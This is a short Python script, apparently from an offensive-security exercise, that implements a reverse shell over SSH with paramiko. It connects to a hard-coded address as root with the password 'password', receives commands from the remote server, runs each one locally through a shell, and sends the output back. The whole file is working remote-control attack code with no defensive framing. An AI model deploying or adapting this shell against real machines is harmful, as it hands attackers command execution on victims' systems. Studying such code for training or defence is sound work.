#!/usr/bin/env python
# -*- coding: utf8 -*-

import paramiko
import subprocess
import logging

logging.basicConfig(level=logging.DEBUG,
                    format='[*] %(name)s - %(funcName)s - %(message)s')


class SSH_Client():
    """acts as a ssh client"""
    def __init__(self):
        self.logger = logging.getLogger('SSHClient')
        self.logger.debug('initializing')
        self.bufsize = 1024

    def connect(self, host, port=22, username=None, password=None):
        self.sshclient = paramiko.SSHClient()

        # Paramiko supports authentication with keys instead of password
        # authentication
        # client.load_host_keys('/home/justin/.ssh/known_hosts')

        # set the policy to accept SSH keys for the SSH server
        # we're connecting to and make the connection

        self.sshclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.logger.debug('accept SSH keys')

        # connect to ssh server
        self.sshclient.connect(host,
                               port=port,
                               username=username,
                               password=password)
        self.logger.debug('connected to ssh server')

        # keys = self.sshclient.get_host_keys()
        transports = self.sshclient.get_transport()

        sshsession = transports.open_session()

        # authenticate successfully and active now
        # if sshsession.authenticated and sshsession.active:
        if sshsession.active:
            # sshsession.send('client says: Welcone here')
            # banner = sshsession.recv(self.bufsize)

            # self.logger.debug('receive data %s' % banner.strip())

            while True:
                command = sshsession.recv(self.bufsize).strip()

                # 1. send command to server
                # cmd_output = self.sshclient.exec_command(command)

                # 2. execute command and send output to server
                proc = subprocess.Popen(command,
                                        stdin=subprocess.PIPE,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        shell=True)

                cmd_output = "%s%s" % (proc.stdout.read(), proc.stderr.read())

                if not cmd_output:
                    break

                # send data length
                datasize = len(cmd_output)
                sshsession.send(str(datasize))

                # send data
                sshsession.sendall(cmd_output)

        self.sshclient.close()

sshc = SSH_Client()
sshc.connect('192.168.1.108', port=8080,  username='root', password='password')
